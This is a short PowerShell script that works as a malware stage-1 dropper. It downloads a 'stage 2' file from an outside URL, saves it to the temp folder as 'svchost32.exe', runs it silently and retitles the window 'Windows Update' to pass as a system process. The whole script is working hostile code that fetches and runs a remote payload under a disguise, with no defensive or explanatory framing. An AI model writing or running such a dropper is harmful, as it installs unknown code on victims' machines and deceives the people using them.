[CmdletBinding()]
param(
    [string]$Stage2Url = "http://contoso.com/update.dat",
    [string]$OutputPath = "$env:TEMP\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $OutputPath)
Start-Process -FilePath $OutputPath -ErrorAction SilentlyContinue
$Host.UI.RawUI.WindowTitle = "Windows Update"
